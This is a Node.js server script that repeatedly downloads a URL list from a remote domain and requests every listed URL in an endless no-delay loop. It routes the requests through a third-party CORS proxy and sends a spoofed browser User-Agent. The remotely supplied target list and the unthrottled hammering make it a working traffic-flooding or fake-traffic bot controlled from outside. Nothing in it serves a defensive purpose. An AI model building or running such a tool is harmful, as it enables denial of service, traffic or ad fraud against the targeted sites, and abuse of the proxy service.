// server.js — CONTINUOUS NO-DELAY
import express from "express";
import https from "https";
import { URL } from "url";

const SOURCE_URL = process.env.SOURCE_URL || "https://ampnyapunyaku.top/api/render-cyber-lockdown-image/node.txt";
const PORT = process.env.PORT || 10000;

const app = express();
app.listen(PORT, () => {
  console.log(`🌐 Service running on ${PORT}`);
  startContinuousFlow();
});

// Fetch URLs menggunakan axios
import axios from "axios";
async function fetchURLs() {
  try {
    const r = await axios.get(SOURCE_URL);
    const urls = String(r.data).split('\n')
      .map(s => s.trim())
      .filter(s => s && s.startsWith('http'));
    console.log(`✅ Loaded ${urls.length} URLs`);
    return urls;
  } catch (e) {
    console.log("❌ Failed to fetch URL list:", e.message);
    return [];
  }
}

// HIT URL USING NATIVE NODE.JS HTTPS
function hitWithNativeHTTP(url) {
  return new Promise((resolve) => {
    const proxiedUrl = `https://cors-anywhere-vercel-dzone.vercel.app/https:/${url.replace(/^https?:\/\//, "")}`;
    const parsedUrl = new URL(proxiedUrl);
    
    console.log(`🎯 ${url.split('?')[0]}`);
    
    const options = {
      hostname: parsedUrl.hostname,
      path: parsedUrl.pathname + parsedUrl.search,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
      },
      timeout: 30000
    };

    const req = https.request(options, (res) => {
      console.log(`📊 Response: ${res.statusCode}`);
      
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      
      res.on('end', () => {
        const success = res.statusCode === 200;
        console.log(success ? '✅ SUCCESS' : `❌ FAILED (${res.statusCode})`);
        resolve(success);
      });
    });

    req.on('error', (error) => {
      console.log(`💥 Error: ${error.message}`);
      resolve(false);
    });

    req.on('timeout', () => {
      console.log('💥 Timeout');
      req.destroy();
      resolve(false);
    });

    req.end();
  });
}

async function startContinuousFlow() {
  console.log("🚀 Starting CONTINUOUS NO-DELAY flow...");
  
  while (true) {
    const urls = await fetchURLs();
    
    // Process all URLs sequentially without delay
    for (const url of urls) {
      await hitWithNativeHTTP(url);
      // NO DELAY - immediately continue to next URL
    }
    
    // Immediately fetch new list and continue
    console.log("🔄 Fetching new URL list...");
  }
}
